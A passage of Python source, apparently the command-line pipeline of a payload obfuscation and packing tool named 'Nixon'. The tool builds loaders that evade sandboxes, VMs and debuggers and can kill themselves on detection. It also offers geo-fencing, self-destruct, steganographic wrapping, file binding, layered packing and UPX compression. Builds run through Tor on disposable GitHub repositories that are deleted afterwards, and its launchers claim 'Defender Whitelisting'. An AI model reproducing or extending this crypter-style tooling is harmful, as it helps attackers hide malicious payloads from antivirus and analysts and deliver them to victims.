                print(f"    [+] Steganography output: {stego_out}")
                generated_outputs.append({'filename': stego_out, 'mode': f'{suffix}_stego', 'sha256': hashlib.sha256(open(stego_out, 'rb').read()).hexdigest()})
            generated_outputs.append({'filename': out_name, 'mode': suffix, 'sha256': hashlib.sha256(final_bytes).hexdigest()})
            if os.path.getsize(out_name) > 100 * 1024 * 1024:
                print(f"    [!] Large output detected: {os.path.getsize(out_name) / (1024*1024):.1f}MB")
                print("    [*] Consider: --skip-debug for Silent build only")
        finally: 
            shutil.rmtree(build_dir)
            t.__exit__(None, None, None)
    print("[*] SUCCESS: Dual Output Generated")
    build_info = {'features': {'hw_locked': hw_enable, 'expiration': args.expire if args.expire else "None", 'network_auth': bool(args.net_url), 'vm_inception': True, 'native_vm': bool(native_blob), 'memory_encryption': True, 'integrity_hmac': True}, 'metrics': {'build_time_sec': round(time.time() - start_time, 4), 'Nixon_Enc_strings': get_legacy_count()}}
    generate_report(base_out_path, build_info, generated_outputs)
    try:
        _tmp_loader = getattr(args, '_tmp_hybrid_loader', None)
        if _tmp_loader and os.path.exists(_tmp_loader):
            os.unlink(_tmp_loader)
    except Exception:
        pass
    return generated_files_map

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s', datefmt='%H:%M:%S')
log = logging.getLogger(__name__)

from obfuscator.version import VERSION, version_string  # noqa: F401

def _make_farm(args, gh_token):
    """Build the cloud-compile farm named by --platform.

    GitHub is the only implemented farm.  The flag exists so the choice
    is explicit and so a second backend can be added without changing
    the call sites; an unknown platform is an error, not a silent
    fallback.
    """
    platform = getattr(args, 'platform', 'auto') or 'auto'
    if platform in ('auto', 'github'):
        return GitHubNuitkaFarm(gh_token,
                                is_public=getattr(args, 'public', False),
                                use_tor=getattr(args, 'tor', False),
                                tor_proxy=getattr(args, 'tor_proxy', None))
    raise ValueError("unknown build farm platform %r (implemented: github)"
                     % (platform,))


def build_parser():
    """Construct the pipeline CLI parser.

    Kept at module level rather than inside main() so the flag
    surface can be imported and inspected.  The flags are part of
    the contract, and a contract that cannot be introspected cannot
    be audited.
    """
    class ConsoleArgumentParser(argparse.ArgumentParser):
        def print_help(self, file=None):
            # ``_console`` lives in utils and a star import does
            # NOT bring underscore names across, so it is looked
            # up on the module: that is the real terminal, even
            # when stdout is redirected into the build log.
            super().print_help(file=file or _nixon_utils._console)
        def print_usage(self, file=None):
            super().print_usage(file=file or _nixon_utils._console)
    custom_fmt = lambda prog: argparse.RawTextHelpFormatter(prog, max_help_position=55)
    parser = ConsoleArgumentParser(formatter_class=custom_fmt, description="Advanced Python Obfuscation & Deployment System", add_help=False)
    parser.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    build = subparsers.add_parser('build', help='Obfuscate and Compile a Python script', formatter_class=custom_fmt, add_help=False)
    build.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    build.add_argument('source', help='Python script path')
    mode_group = build.add_mutually_exclusive_group()
    mode_group.add_argument('--native', action='store_true', help='Native Mode: Cloud Farm Cython Compilation (Hybrid - With Fallback)')
    mode_group.add_argument('--native-only', dest='native_only', action='store_true', help='Strict Native Mode: Cloud Farm Cython Compilation (No Fallback)')
    build.add_argument('--auto', nargs='?', const='cf,nk', help='Automation: cf=Cloudflare, nk=Nuitka (Defaults to cf,nk if no value)')
    build.add_argument('--stego', action='store_true', help='Steganography wrapping')
    build.add_argument('--tor', action='store_true', help='Route build traffic through Tor (default 127.0.0.1:9050; override via --tor-proxy or NIXON_TOR_PROXY)')
    build.add_argument('--tor-proxy', default=None, help='Tor SOCKS endpoint host:port (default 127.0.0.1:9050; env NIXON_TOR_PROXY)')
    build.add_argument('--compile', action='store_true', help='Compile FINAL loader with Nuitka (Creates EXE/ELF)')
    build.add_argument('--lock-hwid', dest='lock_hwid', default='',
                       help='Lock the build to a target HWID: registers a license for it and '
                            'seeds the build deterministically')
    build.add_argument('--watermark', dest='watermark', default='',
                       help='Embed an owner-supplied watermark message in the loader, '
                            'HMAC-tagged and checked at load time: a stripped or edited '
                            'watermark kills the artifact')
    build.add_argument('--strict-detections', dest='strict_detections',
                       action='store_true', default=False,
                       help="Make the loader's environment detections (sandbox, "
                            "emulator, debugger frame, geo-fence, licence) "
                            "terminate the artifact instead of only perturbing "
                            "it (off by default: a detection is a signal, not "
                            "a gate)")
    build.add_argument('--debug-dump-raw', dest='debug_dump_raw',
                       action='store_true', default=False,
                       help='Compile the plaintext-dump debug aid into the artifact '
                            '(it writes the decrypted payload to a 0600 temp file when '
                            'NIXON_DUMP_RAW=1). Off by default: a normal artifact has '
                            'no such capability')
    build.add_argument('--one-shot', action='store_true', help='Self-destruct')
    build.add_argument('--net-url', help='Auth URL (if not using auto=cf)')
    build.add_argument('--tls-ca-bundle', help='PEM CA bundle for the emitted key fetch. The artifact verifies the certificate chain AND the hostname against the system trust store plus this CA (it never disables verification)')
    build.add_argument('--section-split', dest='section_split', action='store_true', default=True,
                       help='Ship the payload as N independently sealed sections instead of one blob, so the whole encrypted payload is never resident in a single buffer. Needs a fallback payload to split, so it is not available with --native-only (default: on)')
    build.add_argument('--no-section-split', dest='section_split', action='store_false',
                       help='Ship the payload as a single blob instead of N sealed sections (default: sections are on)')
    build.add_argument('--section-count', type=int, default=4, help='Number of sealed sections when --section-split is used (default 4)')
    build.add_argument('--opt-level', dest='opt_level', type=int, default=None,
                       help='Protection ladder 0-5: resolve the 17 canonical transform flags from the level. Without it the loader build applies the full set')
    build.add_argument('--bind', help='Bind files inside payload')
    build.add_argument('--expire', help='Expiration Date (YYYY-MM-DD)')
    build.add_argument('--webhook', help='Alert Webhook URL')
    build.add_argument('--bind-mac', help='Bind to MAC address')
    build.add_argument('--allow-countries', help='Allowed country codes')
    build.add_argument('--block-countries', help='Blocked country codes')
    build.add_argument('--allow-regions', help='Allowed regions')
    build.add_argument('--block-regions', help='Blocked regions')
    build.add_argument('--contract', help='Contract address')
    build.add_argument('--rpc', help='RPC URL')
    build.add_argument('--shards', help='Key shard URLs')
    build.add_argument('--auto-deploy', action='store_true', help='Auto deploy contract')
    build.add_argument('--deploy-rpc', help='RPC URL for deployment')
    build.add_argument('--explorer', help='Blockscout URL')
    build.add_argument('--private-key', help='Deployment key')
    build.add_argument('--cf-token', help='Cloudflare API Token (overrides the stored config)')
    build.add_argument('--cf-account', help='Cloudflare Account ID (overrides the stored config)')
    build.add_argument('--licence-token', default='',
                       help='Bind the payload key to a licence token (its '
                            'key_material becomes the customer mask; the '
                            'artefact then needs that token at run time)')
    build.add_argument('--randomization-seed', dest='randomization_seed',
                       type=int, default=None,
                       help='Seed every random draw in the build (keys, '
                            'nonces, salts, timestamp) so the artefact is '
                            'reproducible. Debugging aid: a pinned seed makes '
                            'every artefact from it identical.')
    build.add_argument('--customer-salt', default='',
                       help='Bind the payload key to one customer (mixed as a '
                            'domain-separated second mask; empty = no binding)')
    build.add_argument('--skip-cloud', action='store_true', help='Skip the cloud build farm: build the artifact locally even if --compile/--auto would send it to the farm')
    build.add_argument('--resume', help='Resume waiting for a specific GitHub Run ID (skip upload)')
    build.add_argument('--exclude-android', action='store_true', help='Skip Android build in Nuitka cloud compilation')
    build.add_argument('--public', action='store_true', help='Public Repo Mode (Flash Mode) - Nukes repo after build')
    build.add_argument('--platform', choices=['auto', 'github'], default='auto', help='Build farm platform. "auto" selects the only implemented farm, GitHub')
    build.add_argument('--layers', type=int, help='Recursive packaging layers (default 100)')
    build.add_argument('--zips', type=int, help='Number of ZIP layers')
    build.add_argument('--hwid', default='', help='HWID string for macro expansion / HWID-locked fallback')
    build.add_argument('--trial', default='', help="Trial period spec, e.g. '7d' (parsed via obfuscator.macros.parse_trial)")
    build.add_argument('--vm-threshold', dest='vm_threshold', type=float, default=50.0, help='VM-score verdict threshold (default: 50.0)')
    build.add_argument('--kod', action='store_true', help='Arm the loader kill-on-detect response: the artifact terminates when a detection fires')
    build.add_argument('--hostguard', action='store_true', help='Prepend hostguard snippet to loader')
    build.add_argument('--hwid-lock', dest='hwid_lock', action='store_true', help='HWID-lock the bytecode fallback blob (requires --hwid)')
    build.add_argument('--driver-check', dest='driver_check', action='store_true', help='Bake the kernel-driver gate into the loader')
    build.add_argument('--split-bootstrap', dest='split_bootstrap', action='store_true', help='Shamir (n=3,k=2) threshold key + fragmented decoder')
    build.add_argument('--no-snapshot', dest='snapshot_off', action='store_true', help='Omit the frozen-stdlib snapshot gate')
    build.add_argument('--no-stdlib-audit', dest='stdlib_audit_off', action='store_true', help='Omit the stdlib function-audit gate')
    build.add_argument('--name-gate', dest='name_gate', action='store_true', help='Rewrite privileged call sites through per-build token map')
    build.add_argument('--lowering', default='', help='Semantic-lowering families CSV (default: disabled)')
    build.add_argument('--rename-internal', dest='rename_internal', action='store_true', help='Rename proven-internal public methods/attributes')
    build.add_argument('--no-audit-hook-plant', dest='audit_hook_plant_off', action='store_true', help='Omit the audit-hook plant detector')
    build.add_argument('--python', default=f"{sys.version_info.major}.{sys.version_info.minor}", help='Python version for GitHub Actions (Defaults to local)')
    auth_desc = "Registers a Target Machine Hardware ID (HWID) to the Cloudflare licensing system.\nUses the Cloudflare API Key configured in the setup wizard."
    auth = subparsers.add_parser('auth', help='Authorize a hardware ID (Cloudflare)', description=auth_desc, formatter_class=custom_fmt, add_help=False)
    auth.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    auth.add_argument('--hwid', required=True, help='The SHA256 Hardware ID of the target machine to authorize')
    auth.add_argument('--token-file', help='Path to a .txt file containing the authorization token (if bypassing manual entry)')
    
    clean_desc = "Completely obliterates and wipes all traces of this project from your Cloudflare account.\nDeletes Workers, KV Namespaces, and revokes all active licenses."
    clean = subparsers.add_parser('clean', help='Clean up Cloudflare deployment', description=clean_desc, formatter_class=custom_fmt, add_help=False)
    clean.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help=argparse.SUPPRESS)

    obfuscate_desc = "Obfuscate a Python script (AST transformations only, no compilation)."
    obfuscate = subparsers.add_parser('obfuscate', help='Obfuscate a Python script', description=obfuscate_desc, formatter_class=custom_fmt, add_help=False)
    obfuscate.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    obfuscate.add_argument('source', help='Python script path')
    obfuscate.add_argument('-o', '--output', help='Output file path (default: stdout)')
    obfuscate.add_argument('--cfg-flatten', action='store_true', help='Control-flow flattening')
    obfuscate.add_argument('--opaque-predicates', action='store_true', help='Insert opaque predicates')
    obfuscate.add_argument('--bogus-exceptions', action='store_true', help='Inject fake exception handlers')
    obfuscate.add_argument('--mba-subs', action='store_true', help='MBA expression substitution')
    obfuscate.add_argument('--unicode-ids', action='store_true', help='Rename symbols to Unicode')
    obfuscate.add_argument('--fragment-strings', action='store_true', help='Fragment string constants')
    obfuscate.add_argument('--rename-internal', dest='rename_internal', action='store_true',
                           help='Rename proven-internal public methods/attributes (opt-in, default: off)')
    obfuscate.add_argument('--opt-level', dest='opt_level', type=int, default=None,
                           help='Protection ladder 0-5: resolve the 17 canonical '
                                'transform flags from the level. When given it '
                                'decides those flags and the individual transform '
                                'flags above are ignored (same rule as '
                                'scripts/build.py --opt-level)')

    bf_desc = "Trigger a build-farm workflow on GitHub Actions and wait for artifacts."
    bf = subparsers.add_parser('build-farm', help='Trigger cloud build farm', description=bf_desc, formatter_class=custom_fmt, add_help=False)
    bf.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    bf.add_argument('--payload', help='Path to payload script to upload')
    bf.add_argument('--resume', help='Resume waiting for a specific GitHub Run ID')
    bf.add_argument('--exclude-android', action='store_true', help='Skip Android build')
    bf.add_argument('--python', default=f"{sys.version_info.major}.{sys.version_info.minor}", help='Python version for GitHub Actions')
    bf.add_argument('--public', action='store_true', help='Public repo mode')
    bf.add_argument('--tor', action='store_true', help='Route build-farm traffic through Tor (default 127.0.0.1:9050; override via --tor-proxy or NIXON_TOR_PROXY)')
    bf.add_argument('--tor-proxy', default=None, help='Tor SOCKS endpoint host:port (default 127.0.0.1:9050; env NIXON_TOR_PROXY)')
    bf.add_argument('--platform', choices=['auto', 'github'], default='auto', help='Build farm platform. "auto" selects the only implemented farm, GitHub')

    version_desc = "Show version information and exit."
    version = subparsers.add_parser('version', help='Show version', description=version_desc, formatter_class=custom_fmt, add_help=False)
    version.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    return parser, subparsers


def main():
    # Explicit log setup: the redirect used to happen as a side effect
    # of importing obfuscator.core.utils, which created and truncated
    # ./build.log in whatever directory the tool happened to run in.
    enable_log_redirect()
    is_help = '-h' in sys.argv or '--help' in sys.argv
    if not is_help:
        check_dependencies()
    try:
        cm = ConfigManager()
        if not is_help and len(sys.argv) < 2 and (not cm.get("github_token") or not cm.get("cf_token")):
            cm.run_wizard()
            print("Usage: python3 -m obfuscator.core.pipeline build <script.py> [options]")
            sys.exit(0)
        parser, subparsers = build_parser()

        # The valid commands are read off the subparser registry,
        # not kept in a second hand-maintained list: a new
        # subcommand used to be unreachable until that list was
        # updated too.  The help flags are commands too.
        valid_cmds = sorted(subparsers.choices) + ["-h", "--help"]
        if len(sys.argv) > 1 and sys.argv[1] not in valid_cmds:
            UI._out(f"\n {UI.RED}[!] unknown command {sys.argv[1]!r}; "
                    f"expected one of: {', '.join(valid_cmds)}{UI.RESET}\n")
            parser.print_help(file=_nixon_utils._console)
            sys.exit(1)
        args = parser.parse_args()
        if not getattr(args, 'command', None):
            UI._out(f"\n {UI.RED}[!] no command given; expected one of: "
                    f"{', '.join(valid_cmds)}{UI.RESET}\n")
            parser.print_help(file=_nixon_utils._console)
            sys.exit(1)
        if args.command == 'build':
            auto_cf = False
            auto_nk = False
            if args.auto:
                modes = args.auto.split(',')
                if 'cf' in modes: auto_cf = True
                if 'nk' in modes: auto_nk = True
                if 'nk' in modes: args.compile = True                
            if auto_nk or args.auto: 
                 if not args.native and not args.native_only: 
                     print(" [+] Auto mode enabled: Implies --native (Hybrid)")
                     args.native = True
            if args.stego and auto_nk:
                print(" [!] CONFLICT: --stego incompatible with cloud build")
                sys.exit(1)
            deployed_url = args.net_url
            hmac_key = None
            # The command line wins over the stored config: an
            # explicit --cf-token/--cf-account must not be silently
            # overridden by the saved settings.
            cf_token = args.cf_token or cm.get("cf_token")
            cf_account = args.cf_account or cm.get("cf_account")
            gh_token = cm.get("github_token")
            ntru_priv_key = None
            ntru_pub_key = None
            if True:
                s_s = secrets.randbits(32)
                rng = random.Random(s_s)
                N=509; Q=2048
                priv = [0]*N
                for i in rng.sample(range(N), 15): priv[i] = 1
                for i in rng.sample(range(N), 15): priv[i] = -1 if priv[i] == 0 else priv[i]
                g_p = [0]*N
                for i in rng.sample(range(N), 12): g_p[i] = 1
                for i in rng.sample(range(N), 12): g_p[i] = -1 if g_p[i] == 0 else g_p[i]
                pub = [0]*N
                for i in range(N):
                    for j in range(N): pub[(i+j)%N] = (pub[(i+j)%N] + g_p[i] * priv[j]) % Q
                ntru_priv_key = priv
                ntru_pub_key = repr(pub)
            if auto_cf:
                print("\n[*] [Phase 1] Cloudflare Infrastructure...")
                if not cf_token: print(" [!] Missing Cloudflare Token"); sys.exit(1)
                hmac_key = secrets.token_hex(32)
                deployer = CloudflareDeployer(cf_token, cf_account)
                deployed_url = deployer.deploy_master(hmac_key, ntru_priv=ntru_priv_key)
                if deployed_url: print(f" [+] Worker Active: {deployed_url}")
                else: print(" [!] Cloudflare Deployment Failed."); sys.exit(1)
            print("\n[*] [Phase 3] Generating Universal Loader (Standard Pipeline)...")
            # The parsed namespace IS the build namespace.  It used to
            # be a hand-built argparse.Namespace, which silently
            # dropped every field the copy forgot -- 14 of them
            # (--hwid, --trial, --vm-threshold, --kod, --hostguard,
            # --hwid-lock, --driver-check, --split-bootstrap,
            # --no-snapshot, --no-stdlib-audit, --name-gate,
            # --lowering, --rename-internal, --no-audit-hook-plant)
            # and turned those flags into no-ops.  Overriding only
            # the fields this function computes means a new flag
            # cannot be forgotten.
            args.cf_token = cf_token
            args.cf_account = cf_account
            args.net_url = deployed_url
            args._cf_hmac_key = hmac_key
            args._ntru_pub = ntru_pub_key
            args.gh_token = gh_token
            generated_files_map = build_project(args)
            if not generated_files_map:
                UI.fail("Build failed - no output generated")
                sys.exit(1)
            if not args.one_shot:
                UI.section("PHASE 3: VERIFICATION SUITE")
                ver_rows = []
                engines = set()
                all_ok = True
                for suff in ["Debug", "Silent"]:
                    if generated_files_map and suff in generated_files_map:
                        res = test_command(argparse.Namespace(obfuscated=generated_files_map[suff], original=args.source, silent=True, variant=f"{suff} Version"), skip_header=True)
                        if res:
                            ver_rows.append([f"[◯] {res['variant']}", res['status'], res['integrity'], res['match']])
                            engines.add(res['engine'])
                            if res['status'] != 'PASS': all_ok = False
                
                UI.print_table(["PROFILE VARIANT", "STATUS", "INTEGRITY", "MATCH"], ver_rows)
                UI._out(" │")
                eng_str = " + ".join(list(engines)) if engines else "Unknown"
                UI.item("Crypto Engine", eng_str, "ACTIVE")
                if all_ok:
                    UI.item("Validation Result", f"{UI.GREEN}[SUCCESS] All logic gates verified.{UI.RESET}", "")
                else:
                    UI.item("Validation Result", f"{UI.RED}[FAILURE] Logic verification failed.{UI.RESET}", "")
            else:
                print("\n[*] ONE-SHOT MODE DETECTED: Skipping automated verification to prevent self-destruct.")
            if getattr(args, 'layers', None) is not None:
                num_layers = args.layers
            else:
                if sys.stdin.isatty() and not getattr(args, 'auto', None):
                    try:
                        val = UI.prompt("Recursive layers (1-500, default 100): ")
                        num_layers = int(val) if val else 100
                    except ValueError: num_layers = 100
                else:
                    num_layers = 100
            if not 0 <= num_layers <= 500:
                print("  [!] Layers must be 0-500, using default 100")
                num_layers = 100
            bind_list = []
            if args.bind:
                raw_binds = args.bind.split(',')
                for b in raw_binds:
                     clean_b = b.strip()
                     if clean_b: bind_list.append(clean_b)
            if getattr(args, 'zips', None) is not None:
                num_zips = args.zips
            else:
                default_zips = len(bind_list) if bind_list else 0
                if bind_list:
                     print(f"  [Tip] Suggesting {default_zips} ZIP layers for your {len(bind_list)} bind files.")
                if sys.stdin.isatty() and not getattr(args, 'auto', None):
                    try:
                        val = UI.prompt(f"ZIP layers ({default_zips}): ")
                        num_zips = int(val) if val else default_zips
                    except ValueError: num_zips = default_zips
                else:
                    num_zips = default_zips
            if num_zips < 0: num_zips = 0
            if bind_list and num_zips < 1:
                 print("  [!] Binding requires at least 1 ZIP layer. Setting to 1.")
                 num_zips = 1
            # Build the C core BEFORE the pack, and put it INSIDE the
            # pack.  The loader extracts the bundle into a fresh temp
            # dir and runs __main__.py from there; the payload's FHE/ORAM
            # bootstrap loads "nixon_core.so" from beside __main__.py.
            # A copy in dist/ alone is never in that directory, so every
            # artifact used to run the pure-Python fallback (no-op
            # encrypt/decrypt) and then die in its self-check.  The .so
            # is still left in dist/ for callers that ship the pair.
            _dist_dir = os.path.join(os.path.dirname(os.path.abspath(args.source)), "dist")
            _core_so = None
            try:
                from obfuscator.core.c_core_build import build_c_core as _build_c_core
                _core_so = _build_c_core(_dist_dir)
            except Exception as _core_exc:
                print("  [!] C core build failed: %s" % (_core_exc,))
            _pack_extras = [("nixon_core.so", _core_so)] if _core_so else []
            for suffix in ["Debug", "Silent"]:
                t = generated_files_map.get(suffix)
                if t and os.path.exists(t): 
                    if num_layers > 0 or num_zips > 0:
                        packed_path = t.replace(".py", "_Packed.py")
                        recursive_package(t, packed_path, num_layers, num_zips,
                                          bind_paths_list=bind_list,
                                          extra_files=_pack_extras)
                    else:
                        packed_path = t
                    if (getattr(args, 'compile', False) or (getattr(args, 'auto', False) and 'nk' in getattr(args, 'auto', ''))) and not getattr(args, 'skip_cloud', False):
                        if not getattr(args, 'native', False): 
                            UI.section("PHASE 4: CLOUD COMPILATION")
                        target_payload = packed_path
                        if target_payload and os.path.exists(target_payload):
                            if not gh_token:
                                UI.fail("GitHub token required for Nuitka cloud build.")
                            else:
                                nk_farm = _make_farm(args, gh_token)
                                try:
                                    resume_id = getattr(args, 'resume', None)
                                    if resume_id:
                                        with UI.Task("Resuming", f"Build ID {resume_id}") as t:
                                            run_id = nk_farm.trigger_and_wait(resume_run_id=int(resume_id), exclude_android=getattr(args, 'exclude_android', False), header_suffix=suffix.upper())
                                            if run_id: t.success()
                                            else: t.fail()
                                    elif nk_farm.create_disposable_repo():
                                        scanner = DependencyScanner()
                                        scanner.scan_file(args.source)
                                        dyn_pip = scanner.get_pip_install_cmd()
                                        dyn_flags = scanner.get_nuitka_args()
                                        
                                        if not nk_farm.upload_file(target_payload, "payload.py"):
                                            UI.fatal("Critical: Failed to upload payload.py - Aborting build.")
                                            sys.exit(1)
                                            
                                        nk_farm.create_workflow("payload.py", exclude_android=getattr(args, 'exclude_android', False), pip_command=dyn_pip, extra_nuitka_flags=dyn_flags, python_version=getattr(args, 'python', '3.11'))
                                        run_id = nk_farm.trigger_and_wait(exclude_android=getattr(args, 'exclude_android', False), header_suffix=suffix.upper())
                                    else:
                                        run_id = None
                                        UI.fail("Failed to create/access GitHub repo")
                                    if run_id:
                                        dist_dir = os.path.join(os.path.dirname(target_payload), "dist")
                                        nk_farm.download_artifacts(run_id, dist_dir)
                                        if getattr(args, 'public', False):
                                            nk_farm.nuke()
                                        else:
                                            nk_farm.delete_file("payload.py")
                                        print(f"\n[SUCCESS] Artifacts downloaded to: {dist_dir}")
                                        universal_path = os.path.join(dist_dir, "Universal_Loader.py")
                                        universal_packed = target_payload.replace(".py", "_Universal_Final.py")
                                        if os.path.exists(universal_path):
                                            UI.item("Universal Loader", "Detecting...", "FOUND")
                                            shutil.move(universal_path, universal_packed)
                                            UI.item("Final Payload", universal_packed, "GENERATED")
                                            generated_files_map[suffix] = universal_packed
                                            shutil.rmtree(dist_dir, ignore_errors=True)
                                            continue 
                                        UI.section("PHASE 5: OPTIMIZATION & PACKING")
                                        tar_path = None
                                        with UI.Task("Optimizing", "Strip + UPX") as ot:
                                            tar_path = optimize_and_pack_binaries(dist_dir)
                                            if tar_path: ot.success()
                                            else: ot.fail()
                                        if tar_path and os.path.exists(tar_path):
                                            with UI.Task("Packaging", "Generating XZ Self-Extracting Loader...") as pt:
                                                master_path = target_payload.replace("_Packed.py", "_Universal_Master.py")
                                                generate_xz_loader_file(tar_path, master_path)
                                                pt.success(f"{master_path} ({os.path.getsize(master_path)//1024}KB)")
                                            final_master_packed = master_path.replace(".py", "_Packed.py")
                                            with UI.Task("Final Deliverable", "Applying 4-Layer Recursive Pack") as ft:
                                                recursive_package(master_path, final_master_packed, num_layers=4, num_zips=1)
                                                ft.success(final_master_packed)
                                        else:
                                            UI.warn("Binary optimization failed, falling back to direct loader...")
                                            master_binaries = {}
                                            for fname in os.listdir(dist_dir):
                                                fpath = os.path.join(dist_dir, fname)
                                                if os.path.isfile(fpath) and not fname.endswith((".zip", ".tar")):
                                                    with open(fpath, 'rb') as f:
                                                        b_data = base64.b64encode(f.read()).decode('ascii')
                                                    if "windows" in fname.lower(): master_binaries['windows'] = b_data
                                                    elif "linux" in fname.lower(): master_binaries['linux'] = b_data
                                                    elif "macos" in fname.lower(): master_binaries['darwin'] = b_data
                                                    elif "android" in fname.lower(): master_binaries['android'] = b_data
                                            if master_binaries:
                                                try:
                                                    from universal_helpers import generate_master_loader_script
                                                    master_loader_code = generate_master_loader_script(master_binaries)
                                                    master_path = target_payload.replace("_Packed.py", "_Universal_Master.py")
                                                    with open(master_path, 'w', encoding='utf-8') as f:
                                                        f.write(master_loader_code)
                                                    UI.item("Master Loader", master_path, "GENERATED")
                                                except ImportError:
                                                    if tar_path:
                                                        master_path = target_payload.replace("_Packed.py", "_Universal_Master.py")
                                                        generate_xz_loader_file(tar_path, master_path)
                                                        UI.item("XZ Loader", master_path, "GENERATED")
                                            else:
                                                UI.fail("No Nuitka binaries found to wrap.")
                                except Exception as e:
                                    if UI.current_task:
                                        UI.current_task.fail(str(e))
                                        UI.current_task = None
                                    else:
                                        print(f" [!] Nuitka Build Error: {e}")
                    if getattr(args, 'stego', False):
                         try:
                             with open(packed_path, 'r', encoding='utf-8') as f: content = f.read()
                             stego_path = packed_path.replace(".py", "_Stego.py")
                             stego_wrap_output(content, stego_path)
                             print(f" [+] Stego Output: {stego_path}")
                         except Exception as e:
                             print(f" [!] Stego Failed: {e}")
                    if getattr(args, 'compile', False) and suffix == "Silent":
                        UI.section("PHASE 6: FINAL COMPILATION")
                        with UI.Task("Compiling", f"Native Binary ({packed_path})") as t:
                            try:
                                cmd = [sys.executable, "-m", "nuitka", "--onefile", "--remove-output", "--assume-yes-for-downloads", packed_path]
                                subprocess.run(cmd, check=True, capture_output=True)
                                t.success()
                            except Exception as e:
                                 t.fail(str(e))
            final_rows = []
            base_name = os.path.splitext(os.path.basename(args.source))[0]
            dist_dir = os.path.join(os.path.dirname(os.path.abspath(args.source)), "dist")
            os.makedirs(dist_dir, exist_ok=True)
            # The core was built before the packer ran (it is embedded in
            # the bundle, which is the only place the loader can find it).
            # Report which backend the build actually produced.
            try:
                from obfuscator.core.c_core_build import (
                    missing_loader_symbols,
                )
                _core = _core_so
                if _core:
                    print("    [+] C core built: %s" % _core)
                    _missing = missing_loader_symbols(_core)
                    if _missing:
                        print("    [!] The C core does NOT export %s -- the "
                              "loader will use its pure-Python fallback, where "
                              "the FHE encrypt/decrypt are no-ops.  The FHE/ORAM "
                              "bootstrap is a self-test, not a protection."
                              % ", ".join(_missing))
                    else:
                        print("    [+] The FHE/ORAM C backend is live (the "
                              "bootstrap's round-trip runs against it)")
                else:
                    print("    [!] C core not built; the loader will use the "
                          "pure-Python fallback (the FHE bootstrap verifies nothing)")
            except Exception as _e:
                print("    [!] C core not built (%s); the loader will use the "
                      "pure-Python fallback" % _e)
            for suffix, out_file in generated_files_map.items():
                if out_file and os.path.exists(out_file):
                    if suffix == "Debug":
                        clean_py = f"{base_name}_protected_dbg.py"
                        launcher_base = f"{base_name}_dbg"
                    else:
                        clean_py = f"{base_name}_protected.py"
                        launcher_base = base_name
                    target_path = os.path.join(dist_dir, clean_py)
                    if os.path.exists(target_path): os.remove(target_path)
                    shutil.move(out_file, target_path)
                    launchers = generate_trust_launchers(target_path, output_name_base=launcher_base)
                    final_rows.append(["Universal Payload", suffix, clean_py])
                    if launchers:
                        if os.path.exists(launchers[0]):
                            final_rows.append(["Windows Launcher", suffix, os.path.basename(launchers[0])])
                        if os.path.exists(launchers[1]):
                            final_rows.append(["macOS Launcher", suffix, os.path.basename(launchers[1])])
            UI.section("FINAL: DEPLOYMENT ASSETS")
            UI._out("")
            UI._out(f" ├── Directory         : {dist_dir}")
            UI._out(" ├── Components        :")
            for row in final_rows:
                comp, prof, fname = row
                if "Windows" in comp: tag = "[ Windows ]   "
                elif "macOS" in comp: tag = "[ macOS ]     "
                else: tag = "[ Universal ] "
                UI._out(f" │   ├─ {tag} {fname}")
            UI._out(" │")
            UI._out(" └── Launchers         : Smart-Trust & Defender Whitelisting [READY]")
            UI._out("")
            UI._out(f" {UI.CYAN}ℹ Artifacts moved to: {dist_dir}{UI.RESET}")
            UI._out(f" {UI.GREEN}[✓] ALL OPERATIONS COMPLETE.{UI.RESET}")
        elif args.command == 'auth':
            if not cm.get("cf_token"): print(" [!] Run setup first"); sys.exit(1)
            mgr = CloudflareDeployer(cm.get("cf_token"), cm.get("cf_account"))
            hw_hash = hashlib.sha256(args.hwid.encode()).hexdigest()
            if args.token_file:
                with open(args.token_file,'r')as f: c = f.read().strip()
                mgr.add_license(hw_hash, c, "Auth-CLI")
                print(" [+] Success")
        elif args.command == 'clean':
             if cm.get("cf_token"):
                 CloudflareDeployer(cm.get("cf_token"), cm.get("cf_account")).cleanup()
        elif args.command == 'version':
            print(version_string())
            print(f"Python: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro} ({sys.platform})")
            print(f"File: {os.path.abspath(__file__)}")
        elif args.command == 'obfuscate':
            with open(args.source, 'r', encoding='utf-8') as f:
                source = f.read()
            # The transform set.  With --opt-level the ladder decides the
            # canonical flags (and the individual flags are ignored, the
            # same rule scripts/build.py uses); without it the explicit
            # flags apply, exactly as before.
            opts = {
                'strip_meta': True, 'split_vars': True, 'unfold_constants': True,
                'symbol_rename': True, 'obf_calls': True, 'func_transform': True,
                'rename_internal': bool(getattr(args, 'rename_internal', False)),
            }
            if getattr(args, 'opt_level', None) is not None:
                opts['opt_level'] = args.opt_level
            else:
                opts.update({
                    'cfg_flatten': args.cfg_flatten,
                    'opaque_predicates': args.opaque_predicates,
                    'bogus_exceptions': args.bogus_exceptions,
                    'mba_subs': args.mba_subs,
                    'unicode_ids': args.unicode_ids,
                    'fragment_strings': args.fragment_strings,
                })
            # Route through build_pipeline so this CLI and
            # scripts/build.py use ONE obfuscation implementation (the
            # residue pass and the opt-level ladder included).
            obfuscated = build_pipeline(source, extra_options=opts)
            if args.output:
                with open(args.output, 'w', encoding='utf-8') as f:
                    f.write(obfuscated)
                print(f"[+] Obfuscated output written to: {args.output}")
            else:
                sys.stdout.write(obfuscated)
        elif args.command == 'build-farm':
            gh_token = cm.get("github_token")
            if not gh_token:
                UI.fatal("GitHub token required for build farm. Run setup first.")
                sys.exit(1)
            farm = _make_farm(args, gh_token)
            resume_id = getattr(args, 'resume', None)
            if resume_id:
                farm.trigger_and_wait(resume_run_id=int(resume_id), exclude_android=args.exclude_android)
            else:
                payload = getattr(args, 'payload', None)
                if not payload:
                    UI.fatal("--payload required for new build-farm jobs")
                    sys.exit(1)
                if farm.create_disposable_repo():
                    scanner = DependencyScanner()
                    scanner.scan_file(payload)
